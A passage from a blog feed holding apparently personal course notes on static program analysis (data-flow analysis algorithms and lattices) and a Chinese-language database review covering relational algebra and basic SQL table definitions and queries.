Analysis-Applications"></a>0x03Data Flow Analysis-Applications</h1><h2 id="1-Overview"><a href="#1-Overview" class="headerlink" title="1.Overview"></a>1.Overview</h2><p><img src="/2021/05/03/static-program/image-20210316162556579.png" alt="image-20210316162556579"></p><p><img src="/2021/05/03/static-program/image-20210316163402058.png" alt="image-20210316163402058"></p><h3 id="Transfer-Function"><a href="#Transfer-Function" class="headerlink" title="Transfer Function"></a>Transfer Function</h3><ul><li>forward</li><li>backward</li></ul><p><img src="/2021/05/03/static-program/image-20210316164525008.png" alt="image-20210316164525008"></p><h3 id="Control-Flow"><a href="#Control-Flow" class="headerlink" title="Control Flow"></a>Control Flow</h3><p><img src="/2021/05/03/static-program/image-20210316165009528.png" alt="image-20210316165009528"></p><h2 id="2-Reaching-Definitions-Analysis"><a href="#2-Reaching-Definitions-Analysis" class="headerlink" title="2. Reaching Definitions Analysis"></a>2. Reaching Definitions Analysis</h2><h3 id="definition"><a href="#definition" class="headerlink" title="definition"></a>definition</h3><p><img src="/2021/05/03/static-program/image-20210316165640682.png" alt="image-20210316165640682"></p><h3 id="understanding"><a href="#understanding" class="headerlink" title="understanding"></a>understanding</h3><p>Focus on definition</p><p>transfer Function</p><ul><li>generate a definition</li><li>kill other definition</li></ul><p>control flow</p><p><img src="/2021/05/03/static-program/image-20210316171733031.png" alt="image-20210316171733031"></p><p><strong>eg</strong></p><p><img src="/2021/05/03/static-program/image-20210316172331897.png" alt="image-20210316172331897"></p><h3 id="algorithm"><a href="#algorithm" class="headerlink" title="algorithm"></a>algorithm</h3><p>这里有两个点需要看一下</p><ol><li>为什么OUT[entry]=空？因为入口处并未定义。此外，为什么不把OUT[entry]放入for循环中？因为要有一个模板生成算法</li><li>下面这个while中for循环的停止条件在哪里？</li></ol><p><img src="/2021/05/03/static-program/image-20210316172851109.png" alt="image-20210316172851109"></p><p><strong>eg</strong></p><p>how  CFG transfer to SourceCode？</p><p><img src="/2021/05/03/static-program/image-20210316173536011.png" alt="image-20210316173536011"></p><p>next,we will see the changes on the OUT[].</p><p>we should focus on two points</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IN[B] &#x3D; union(p a predecessor of B OUT[P]);</span><br><span class="line">OUT[B] &#x3D; genB(IN[B]-killB);</span><br></pre></td></tr></table></figure><p>until no changes occur on OUT</p><p><img src="/2021/05/03/static-program/image-20210316223814163.png" alt="image-20210316223814163"></p><p>There are two sentences.</p><p>This is very important</p><p>In each data-flow analysis application, we associate with every program point a <strong>data-flow value</strong> that represents an <strong>abstraction</strong> of the set of all possible <strong>program states</strong> that can be observed for the point.</p><p>Data-flow analysis is to <strong>find a solution</strong> to a set of <strong>safe-approximation</strong> directed constraints on the IN’s and OUT’s,for all statements.</p><p>And why this algorithm can stop?</p><p><img src="/2021/05/03/static-program/image-20210316225904275.png" alt="image-20210316225904275"></p><h2 id="3-Live-Variables-Analysis"><a href="#3-Live-Variables-Analysis" class="headerlink" title="3. Live Variables Analysis"></a>3. Live Variables Analysis</h2><h3 id="definition-1"><a href="#definition-1" class="headerlink" title="definition"></a>definition</h3><p><img src="/2021/05/03/static-program/image-20210316230830828.png" alt="image-20210316230830828"></p><h3 id="understanding-1"><a href="#understanding-1" class="headerlink" title="understanding"></a>understanding</h3><p>Focus on variables</p><p><img src="/2021/05/03/static-program/image-20210316231409321.png" alt="image-20210316231409321"></p><p><img src="/2021/05/03/static-program/image-20210317170644795.png" alt="image-20210317170644795"></p><h3 id="algorithm-1"><a href="#algorithm-1" class="headerlink" title="algorithm"></a>algorithm</h3><p><img src="/2021/05/03/static-program/image-20210317171158537.png" alt="image-20210317171158537"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IN[B] &#x3D; useB union (OUT[B]-defB)</span><br><span class="line">OUT[B] &#x3D; union s a successor of B IN[S]</span><br></pre></td></tr></table></figure><p><img src="/2021/05/03/static-program/image-20210317173026174.png" alt="image-20210317173026174"></p><h2 id="4-Available-Expressions-Analysis"><a href="#4-Available-Expressions-Analysis" class="headerlink" title="4. Available Expressions Analysis"></a>4. Available Expressions Analysis</h2><h3 id="definition-2"><a href="#definition-2" class="headerlink" title="definition"></a>definition</h3><p><img src="/2021/05/03/static-program/image-20210317173623458.png" alt="image-20210317173623458"></p><h3 id="understanding-2"><a href="#understanding-2" class="headerlink" title="understanding"></a>understanding</h3><p>Focus on expressions</p><p><img src="/2021/05/03/static-program/image-20210317174047841.png" alt="image-20210317174047841"></p><p><img src="/2021/05/03/static-program/image-20210317175430257.png" alt="image-20210317175430257"></p><h3 id="algorithm-2"><a href="#algorithm-2" class="headerlink" title="algorithm"></a>algorithm</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">OUT[B] &#x3D; genB union (IN[B]-killB)</span><br><span class="line">IN[B] &#x3D; 交 P a predecessor of B OUT[P]</span><br></pre></td></tr></table></figure><p><img src="/2021/05/03/static-program/image-20210317194602113.png" alt="image-20210317194602113"></p><h2 id="5-Analysis-Comparison"><a href="#5-Analysis-Comparison" class="headerlink" title="5. Analysis Comparison"></a>5. Analysis Comparison</h2><p><img src="/2021/05/03/static-program/image-20210317195618231.png" alt="image-20210317195618231"></p><h1 id="0x04-Data-Flow-Analysis-Foundations"><a href="#0x04-Data-Flow-Analysis-Foundations" class="headerlink" title="0x04 Data-Flow-Analysis Foundations"></a>0x04 Data-Flow-Analysis Foundations</h1><h2 id="1-Iterative-Algorithm"><a href="#1-Iterative-Algorithm" class="headerlink" title="1. Iterative Algorithm"></a>1. Iterative Algorithm</h2><p><strong>why</strong></p><p>This has a fixed point.</p><p><img src="/2021/05/03/static-program/image-20210317202238222.png" alt="image-20210317202238222"></p><h2 id="2-Partial-Order"><a href="#2-Partial-Order" class="headerlink" title="2. Partial Order"></a>2. Partial Order</h2><h2 id="3-Lattice"><a href="#3-Lattice" class="headerlink" title="3. Lattice"></a>3. Lattice</h2><h2 id="4-Data-Flow-Analysis-Framework-via-Lattice"><a href="#4-Data-Flow-Analysis-Framework-via-Lattice" class="headerlink" title="4. Data Flow Analysis Framework via Lattice"></a>4. Data Flow Analysis Framework via Lattice</h2><p><img src="/2021/05/03/static-program/image-20210317205624533.png" alt="image-20210317205624533"></p><h2 id="5-Relate-Iterative-Algorithm-to-Fixed-Point-Theorem"><a href="#5-Relate-Iterative-Algorithm-to-Fixed-Point-Theorem" class="headerlink" title="5. Relate Iterative Algorithm to Fixed-Point Theorem"></a>5. Relate Iterative Algorithm to Fixed-Point Theorem</h2>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x01-Static-Program-Analysis&quot;&gt;&lt;a href=&quot;#0x01-Static-Program-Analysis&quot; class=&quot;headerlink&quot; title=&quot;0x01 Static Program Analysis&quot;&gt;&lt;/a&gt;0x01 Static Program Analysis&lt;/h1&gt;</summary>
    
    
    
    
    <category term="Course" scheme="https://pz1o.top/tags/Course/"/>
    
  </entry>
  
  <entry>
    <title>Database review</title>
    <link href="https://pz1o.top/2021/05/03/Database-review/"/>
    <id>https://pz1o.top/2021/05/03/Database-review/</id>
    <published>2021-05-03T08:12:11.000Z</published>
    <updated>2021-06-09T11:46:54.223Z</updated>
    
    <content type="html"><![CDATA[<p>复习</p><a id="more"></a><p>各章节需要掌握的内容</p><p><img src="/2021/05/03/Database-review/image-20210503155841659.png" alt></p><p><img src="/2021/05/03/Database-review/image-20210503160432223.png" alt="image-20210503160432223"></p><p><img src="/2021/05/03/Database-review/image-20210503160508449.png" alt="image-20210503160508449"></p><h1 id="0x01-第一章-绪论"><a href="#0x01-第一章-绪论" class="headerlink" title="0x01 第一章 绪论"></a>0x01 第一章 绪论</h1><h2 id="1-1-数据库基本概念"><a href="#1-1-数据库基本概念" class="headerlink" title="1.1 数据库基本概念"></a>1.1 数据库基本概念</h2><p>数据库（DB）：数据库是指在计算机的存储设备上合理存放、相关联、有结构的数据集合。</p><p>数据库管理系统（DBMS）：位于用户和操作系统之间的一层数据管理软件。</p><p>数据库系统（DBS）：引进数据库和数据库管理系统后的组成。</p><p>数据库应用系统（DBAS）：数据库系统及其应用程序的组成。</p><p><img src="/2021/05/03/Database-review/image-20210503165104565.png" alt="image-20210503165104565"></p><h2 id="1-2-数据库系统特点"><a href="#1-2-数据库系统特点" class="headerlink" title="1.2 数据库系统特点"></a>1.2 数据库系统特点</h2><h3 id="数据库管理技术发展共有三个阶段"><a href="#数据库管理技术发展共有三个阶段" class="headerlink" title="数据库管理技术发展共有三个阶段"></a>数据库管理技术发展共有三个阶段</h3><p><strong>1.人工管理阶段</strong></p><p>特点</p><p>(1)计算机系统不提供对用户数据的管理功能；</p><p>(2)数据不能共享；</p><p>(3)不保存数据。</p><p><strong>2.文件系统阶段</strong></p><p>特点:</p><p>数据以“文件”形式可长期保存在外部存储器的磁盘上。由于计算机的应用转向信息管理，因此对文件要进行大量的查询、修改和插入等操作，这些操作由文件系统提供。  </p><p>缺点:</p><p>数据冗余;不一致性;数据独立性差;数据无结构。</p><p><strong>3.数据库系统阶段</strong></p><p>特点:</p><p>（1）数据结构化。</p><p>（2）数据共享性高、冗余少且易扩充。</p><p>（3）数据独立性高。</p><p>（4）数据由DBMS统一管理和控制。</p><h2 id="1-3-数据模型"><a href="#1-3-数据模型" class="headerlink" title="1.3 数据模型"></a>1.3 数据模型</h2><h3 id="数据模型概念"><a href="#数据模型概念" class="headerlink" title="数据模型概念"></a>数据模型概念</h3><p>现实世界数据特征的模拟和抽象。</p><h3 id="数据模型的分类"><a href="#数据模型的分类" class="headerlink" title="数据模型的分类"></a>数据模型的分类</h3><ol><li><p>概念数据模型：按用户的观点来对数据和信息建模，主要用于数据库设计</p><p>概念模型的表示方法很多，最常用的为实体-联系方法(Entity-Relationship approach），该方法用E-R图来描述概念模型。E-R方法也成为E-R模型</p></li><li><p>逻辑数据模型：包括层次模型、网状模型、关系模型、面向对象模型和对象关系数据模型等，主要用于数据库管理系统的实现。</p></li><li><p>物理数据模型：对数据最底层的抽象，它描述数据在系统内部的表示方法和存取方法，在磁盘或磁带上的存储方式和存取方法，是面向计算机系统的。</p></li></ol><h3 id="数据模型的组成要素"><a href="#数据模型的组成要素" class="headerlink" title="数据模型的组成要素"></a>数据模型的组成要素</h3><p>数据模型通常由<strong>数据结构、数据操作和完整性约束</strong>三个部分组成。</p><p>数据结构描述数据库的组成对象以及对象之间的联系，通常按其数据结构的类型来命名数据模型，例如层次结构、网状结构和关系结构的数据模型分别命名为层次模型、网状模型、关系模型。</p><p>数据操作是指对数据库中各种对象的实例允许执行的操作的集合，包括操作及其有关的规则，主要分为查询和更新（插入、删除、修改）两大类操作。</p><p>完整性约束条件是给定的数据模型中数据及其联系所具有的制约和依存规则，在关系模型中体现为实体完整性和参照完整性。例如，某大学的数据库中规定学生成绩如果有6门以上不及格则不能授予学士学位，教授的退休年龄是65周岁等。</p><h2 id="1-4-实体联系数据模型"><a href="#1-4-实体联系数据模型" class="headerlink" title="1.4 实体联系数据模型"></a>1.4 实体联系数据模型</h2><h3 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h3><p>实体：客观存在并可相互区别的个体。如：学生。</p><p>实体特性：描述实体的主要特征。如：学生的年龄，学号，性别等。</p><p>实体集：具有相同特性实体的集合。如：一个学校的学生。</p><p>实体标识符：在实体集中唯一能确定实体集的中的某个实体最小实体特性集。如：学号可以唯一确定学生。<strong>可以由多个实体特性组成。</strong></p><h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><ol><li>一个实体记录可以有若干个属性</li><li>不可再分的属性叫原子属性，可再分的属性叫可分属性</li><li>属性有型与值之分</li><li>值域（属性值的范围）</li><li>关键字</li></ol><h3 id="实体集之间的联系"><a href="#实体集之间的联系" class="headerlink" title="实体集之间的联系"></a>实体集之间的联系</h3><ol><li>实体内部联系</li><li>实体集联系</li></ol><p>实体集间的联系：</p><ol><li>二元联系：只有两个实体集参与的联系</li><li>多元联系：参与实体集大于等于3的联系</li><li>自反联系：同一实体集内实体内部的联系</li></ol><h3 id="E-R图"><a href="#E-R图" class="headerlink" title="E-R图"></a>E-R图</h3><p>看箭头</p><p><img src="/2021/05/03/Database-review/image-20210504211912646.png" alt="image-20210504211912646"></p><h2 id="1-5-数据库系统体系结构"><a href="#1-5-数据库系统体系结构" class="headerlink" title="1.5 数据库系统体系结构"></a>1.5 数据库系统体系结构</h2><h3 id="数据库系统的三级模式结构"><a href="#数据库系统的三级模式结构" class="headerlink" title="数据库系统的三级模式结构"></a>数据库系统的三级模式结构</h3><p>外模式：<strong>也称子模式或用户模式</strong>，数据库用户（包括应用程序员和最终用户）使用的局部数据的逻辑结构和特征的描述。</p><p>模式：称为<strong>概念模式或者逻辑模式</strong>，是对数据库全体逻辑结构的描述,是数据库所有用户的公共数据视图，是由数据库设计者综合所有用户数据，按照统一的观点构造的对数据库全局逻辑结构的描述。</p><p>内模式：<strong>也称存储模式</strong>，是数据物理结构和存储方式的描述，数据在数据库的内部表示方式。</p><p><img src="/2021/05/03/Database-review/image-20210504212756830.png" alt="image-20210504212756830"></p><h1 id="0x02-第二章-关系模型"><a href="#0x02-第二章-关系模型" class="headerlink" title="0x02 第二章 关系模型"></a>0x02 第二章 关系模型</h1><h2 id="2-1-基本概念"><a href="#2-1-基本概念" class="headerlink" title="2.1 基本概念"></a>2.1 基本概念</h2><p><strong>1.域（Domain）</strong>：域是一组具有相同数据类型的值的集合，例如整数、自然数都是域</p><p><strong>2.笛卡尔积（Cartesian Product）</strong>：笛卡尔积是域上面的一种集合运算。</p><p>给定一组域D1，D2，…，Dn，允许其中某些域是相同的。 D1，D2，…，Dn的笛卡尔积为：</p><p><img src="/2021/05/03/Database-review/20190629192647367.png" alt="img"></p><p>笛卡尔积中每个元素(d1,d2,…dn)称为一个n元组或简称<strong>元组</strong></p><p>笛卡尔积可表示为一个二维表，<strong>表中每行对应一个元组，表中每一列的值来自一个域</strong></p><p><strong>3.关系（Relation）</strong></p><p>D1×D2×…×Dn的子集叫作在域D1，D2，…，Dn上的关系，</p><p>表示为R（D1，D2，…，Dn）</p><p>R：关系名</p><p>n：关系的目或度（Degree）</p><p>关系也是一个二维表，每行对应一个元组，每列对应一个域，每列称为属性</p><p>若关系中的某一属性组的值能唯一地标识一个元组，则称该属性组为<strong>候选码（Candidate key）</strong></p><p>若一个关系有多个候选码，则选定其中一个或多个为<strong>主码（Primary key）</strong></p><p>候选码的多个属性称为<strong>主属性</strong>（Prime attribute），不包含在任何候选码中的属性称为<strong>非主属性</strong>；最简单的情况下，候选码只包含一个属性，如果关系模式的所有属性都是这个关系的候选码，则称为<strong>全码</strong>（All-key）</p><p><strong>外码(Foreign Key)</strong>：设F是基本关系R的一个或一组属性，但不是R的码。Ks是基本关系S的主码。如果F与Ks相对应，则称F是R的外码。并称基本关系R为参照关系(Referencing Relation)，基本关系S为被参照关系（Referenced Relationship)<strong>规则:对于R中每个元组在F上的值必须为:取空值或等于S中某个元组的主码值</strong></p><h2 id="2-2-关系操作和完整性约束"><a href="#2-2-关系操作和完整性约束" class="headerlink" title="2.2 关系操作和完整性约束"></a>2.2 关系操作和完整性约束</h2><p>关系操作两类：关系检索和关系更新（插入，删除，修改）</p><p>关系模型的完整性规则是对关系的某种约束条件，关系模型中有三类完整性约束：</p><p><strong>实体完整性（Entity Integrity）</strong>：关系模型以主码作为唯一性标识，主码中的属性即主属性不能取空值</p><p><strong>参照完整性（Referential Integrity）</strong>：外码</p><p><strong>用户自定义完整性（User-defined Integrity）</strong>：反映某一具体应用所涉及的数据必须满足的语义要求</p><h2 id="2-3-关系代数-传统集合"><a href="#2-3-关系代数-传统集合" class="headerlink" title="2.3 关系代数 传统集合"></a>2.3 关系代数 传统集合</h2><p>相容关系为前提</p><p>并，差，交运算</p><p>广义笛卡尔积运算</p><h2 id="2-4-关系代数运算"><a href="#2-4-关系代数运算" class="headerlink" title="2.4 关系代数运算"></a>2.4 关系代数运算</h2><h3 id="选择"><a href="#选择" class="headerlink" title="选择"></a>选择</h3><p>选择运算是从关系R中选取使逻辑表达式F为真的元组，是从行的角度进行的运算</p><p><img src="/2021/05/03/Database-review/20190629192739586.png" alt="img"></p><p>如查询信息系（IS系）全体学生  <img src="/2021/05/03/Database-review/20190629192743765.png" alt="img"></p><h3 id="投影"><a href="#投影" class="headerlink" title="投影"></a>投影</h3><p>投影操作主要是从列的角度进行运算，但投影成功之后不仅取消了原关系中的某些列，而且还可能取消某些元组（避免重复行）</p><p><img src="/2021/05/03/Database-review/20190629192754689.png" alt="img"></p><p>如查询学生的姓名和所在系 <img src="/2021/05/03/Database-review/20190629192758641.png" alt="img"></p><h3 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h3><p>连接运算的含义：从两个关系的笛卡尔积中选取属 性间满足一定条件的元组</p><p><strong>等值连接</strong>：θ为’=’的连接运算称为等值连接，即选取属性相等的元组</p><p><strong>自然连接</strong>：特殊的等值连接，两个关系中进行比较的分量必须是相同的属性组，在结果中要把重复的属性列去掉</p><p>两者的区别：</p><ol><li>一般的连接操作是从行的角度进行运算的，自然连接还需要取消重复列，所以是同时从行和列的角度进行运算。</li><li><strong>自然连接是特殊的等值连接，相同的属性组进行比较，并去除重复的属性列。即笛卡尔积里找出B相等的然后合并R.B和S.B为B</strong>。</li><li>等值连接可以不是公共属性，但自然连接必须是公共属性。</li></ol><h3 id="除"><a href="#除" class="headerlink" title="除"></a>除</h3><p>除操作是同时从行和列的角度进行运算的</p><p><img src="/2021/05/03/Database-review/20190629192919637.png" alt="img"></p><p><img src="/2021/05/03/Database-review/20190629192922956.png" alt="img"></p><p>通常运用于“所有的”这类情况。</p><p><img src="/2021/05/03/Database-review/20190629192929734.png" alt="img"></p><p>例题：</p><p><img src="/2021/05/03/Database-review/image-20210505142838842.png" alt="image-20210505142838842"></p><h2 id="2-5-查询优化"><a href="#2-5-查询优化" class="headerlink" title="2.5 查询优化"></a>2.5 查询优化</h2><p>三种优化：代数优化、物理优化和代价估算优化</p><h3 id="等价变换规则："><a href="#等价变换规则：" class="headerlink" title="等价变换规则："></a><strong>等价变换规则：</strong></h3><ol><li>连接、笛卡尔积交换律<img src="/2021/05/03/Database-review/image-20210505152604468.png" alt="image-20210505152604468"></li><li>连接、笛卡尔积结合律<img src="/2021/05/03/Database-review/image-20210505152614300.png" alt="image-20210505152614300"></li><li>投影的串接定律</li><li>选择的串接定律</li><li>选择和投影的交换律<img src="/2021/05/03/Database-review/image-20210505152850683.png" alt="image-20210505152850683"></li><li>选择和笛卡尔积的交换律<img src="/2021/05/03/Database-review/image-20210505153114367.png" alt="image-20210505153114367"></li></ol><h3 id="查询优化策略"><a href="#查询优化策略" class="headerlink" title="查询优化策略"></a>查询优化策略</h3><ol><li>尽可能早地执行选择操作</li><li>合并笛卡尔积和其后的选择操作，使其称为一个连接运算</li><li>合并连续的选择和投影操作</li></ol><h3 id="优化算法"><a href="#优化算法" class="headerlink" title="优化算法"></a>优化算法</h3><p><img src="/2021/05/03/Database-review/image-20210505154446428.png" alt="image-20210505154446428"></p><h1 id="0x03-第三章-关系数据库标准语言SQL"><a href="#0x03-第三章-关系数据库标准语言SQL" class="headerlink" title="0x03 第三章 关系数据库标准语言SQL"></a>0x03 第三章 关系数据库标准语言SQL</h1><h2 id="3-1-SQL概述"><a href="#3-1-SQL概述" class="headerlink" title="3.1 SQL概述"></a>3.1 SQL概述</h2><h2 id="3-2-数据定义"><a href="#3-2-数据定义" class="headerlink" title="3.2 数据定义"></a>3.2 数据定义</h2><h3 id="定义基本表"><a href="#定义基本表" class="headerlink" title="定义基本表"></a>定义基本表</h3><p><img src="/2021/05/03/Database-review/image-20210505161003549.png" alt="image-20210505161003549"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student(</span><br><span class="line"><span class="keyword">id</span> <span class="built_in">int</span> auto_increment primary <span class="keyword">key</span>, // <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">UNIQUE</span></span><br><span class="line"><span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">50</span>),</span><br><span class="line">sex <span class="built_in">varchar</span>(<span class="number">20</span>),</span><br><span class="line"><span class="built_in">date</span> <span class="built_in">varchar</span>(<span class="number">50</span>),</span><br><span class="line"><span class="keyword">content</span> <span class="built_in">varchar</span>(<span class="number">100</span>)</span><br><span class="line">)<span class="keyword">default</span> <span class="keyword">charset</span>=utf8;</span><br><span class="line"><span class="comment">#char(n) varchar(n)</span></span><br><span class="line"><span class="comment">#binary(n) varbinary(n)</span></span><br><span class="line"><span class="comment">#int smallint</span></span><br><span class="line"><span class="comment">#float double</span></span><br><span class="line"><span class="comment">#date</span></span><br><span class="line"><span class="comment">#time</span></span><br><span class="line"><span class="comment">#timestamp</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#实体完整性约束</span></span><br><span class="line"><span class="comment">#主码约束 PRIMARY KEY</span></span><br><span class="line"><span class="comment">#参照完整性</span></span><br><span class="line"><span class="comment">#外码约束 FOREIGN KEY</span></span><br><span class="line"><span class="comment">#用户自定义完整性</span></span><br><span class="line"><span class="comment">#非空 NOT NULL</span></span><br><span class="line"><span class="comment">#唯一 UNIQUE</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student(</span><br><span class="line"><span class="keyword">id</span> <span class="built_in">int</span> <span class="keyword">references</span> s(<span class="keyword">key</span>),</span><br><span class="line"><span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">50</span>) <span class="keyword">default</span> <span class="string">'xx'</span>,</span><br><span class="line">sex <span class="built_in">varchar</span>(<span class="number">20</span>) <span class="keyword">check</span>(sex=<span class="string">"male"</span> <span class="keyword">or</span> sex=<span class="string">"female"</span>),</span><br><span class="line"><span class="built_in">date</span> <span class="built_in">varchar</span>(<span class="number">50</span>),</span><br><span class="line"><span class="keyword">content</span> <span class="built_in">varchar</span>(<span class="number">100</span>),</span><br><span class="line">primary <span class="keyword">key</span>(<span class="keyword">id</span> ,<span class="keyword">name</span>)</span><br><span class="line"><span class="keyword">foreign</span> <span class="keyword">key</span>(<span class="keyword">id</span>) <span class="keyword">references</span> s(<span class="keyword">key</span>)</span><br><span class="line">)<span class="keyword">default</span> <span class="keyword">charset</span>=utf8;</span><br></pre></td></tr></table></figure><h3 id="修改表结构"><a href="#修改表结构" class="headerlink" title="修改表结构"></a>修改表结构</h3><p><img src="/2021/05/03/Database-review/image-20210505170855019.png" alt="image-20210505170855019"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//新增属性</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> student <span class="keyword">add</span> phone <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>;</span><br><span class="line">//删除属性</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> student <span class="keyword">drop</span> primary <span class="keyword">key</span>;</span><br><span class="line">//新增外码约束名</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> student <span class="keyword">add</span> <span class="keyword">constraint</span> sno_key <span class="keyword">foreign</span> <span class="keyword">key</span>(<span class="keyword">id</span>) <span class="keyword">references</span> s(<span class="keyword">id</span>);</span><br><span class="line">//通过约束名删除</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> student <span class="keyword">drop</span> <span class="keyword">foreign</span> <span class="keyword">key</span> sno_key;</span><br><span class="line">//修改属性</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> student <span class="keyword">modify</span> phone <span class="built_in">smallint</span>;</span><br><span class="line">//删除基本表</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> student;</span><br></pre></td></tr></table></figure><h2 id="3-3-索引"><a href="#3-3-索引" class="headerlink" title="3.3 索引"></a>3.3 索引</h2><p><img src="/2021/05/03/Database-review/image-20210505172628228.png" alt="image-20210505172628228"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//建立索引</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">unique</span> <span class="keyword">index</span> Stusno <span class="keyword">on</span> student(<span class="keyword">sid</span> <span class="keyword">ASC</span>);</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">unique</span> <span class="keyword">index</span> Coucno <span class="keyword">on</span> course(cid <span class="keyword">ASC</span>);</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">unique</span> <span class="keyword">index</span> SCno <span class="keyword">on</span> study(<span class="keyword">id</span> <span class="keyword">ASC</span>,cid <span class="keyword">DESC</span>);</span><br><span class="line">//删除索引</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">index</span> Stusno;</span><br></pre></td></tr></table></figure><h2 id="3-4-单表查询"><a href="#3-4-单表查询" class="headerlink" title="3.4 单表查询"></a>3.4 单表查询</h2><p><img src="/2021/05/03/Database-review/image-20210505184519452.png" alt="image-20210505184519452"></p><p><strong>where子句常用查询条件</strong></p><p><img src="/2021/05/03/Database-review/image-20210505184800139.png" alt="image-20210505184800139"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">//聚集函数</span><br><span class="line">COUNT（*）                                    统计元组个数  </span><br><span class="line">COUNT（[DISTINCT|ALL] &lt;列名&gt;）  统计一列中值的个数</span><br><span class="line">SUM（[DISTINCT|ALL] &lt;列名&gt;）   计算一列值的总和（此列必须为数值型）</span><br><span class="line">AVG（[DISTINCT|ALL] &lt;列名&gt;）            计算一列值的平均值（此列必须为数值型）</span><br><span class="line">MAX（[DISTINCT|ALL] &lt;列名&gt;）      求一列中的最大值</span><br><span class="line">MIN（[DISTINCT|ALL] &lt;列名&gt;）       求一列中的最小值</span><br><span class="line">如果指定DISTINCT短语，则表示在计算时取消指定列中的重复值，ALL为缺省值，表示不取消重复值</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*) <span class="keyword">FROM</span> Student <span class="comment">/* 查询学生总人数 */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//<span class="keyword">where</span>谓词eg</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> 学院=<span class="string">"计算机"</span> <span class="keyword">and</span> 出生年份 &gt;=<span class="number">2000</span>;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> 出生年份 <span class="keyword">between</span> <span class="number">1996</span> amd <span class="number">1998</span>;</span><br><span class="line"><span class="keyword">select</span> sno,sname <span class="keyword">from</span> student <span class="keyword">where</span> 学院 <span class="keyword">in</span> (<span class="string">"计算机"</span>,<span class="string">"信电"</span>);</span><br><span class="line">//a%b 以a开头b结尾任意长度的字符串</span><br><span class="line">//a_b 以a开头b结尾3长度的字符串</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> sname <span class="keyword">like</span> <span class="string">"王%"</span> ESCAPE <span class="string">"\ "</span>;\</span><br><span class="line"><span class="keyword">select</span> sno,sname <span class="keyword">from</span> student <span class="keyword">where</span> 学院 <span class="keyword">is</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">//集函数eg</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">as</span> 总人数 <span class="keyword">from</span> student;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">AVG</span>(<span class="keyword">year</span>(<span class="keyword">now</span>())-出生年份) <span class="keyword">as</span> 平均年龄 <span class="keyword">from</span> student;</span><br><span class="line"></span><br><span class="line">//group by eg</span><br><span class="line"><span class="keyword">select</span> cno,<span class="keyword">count</span>(sno) <span class="keyword">as</span> 人数 <span class="keyword">from</span> sc <span class="keyword">group</span> <span class="keyword">by</span> cno;</span><br><span class="line"><span class="keyword">select</span> sno,<span 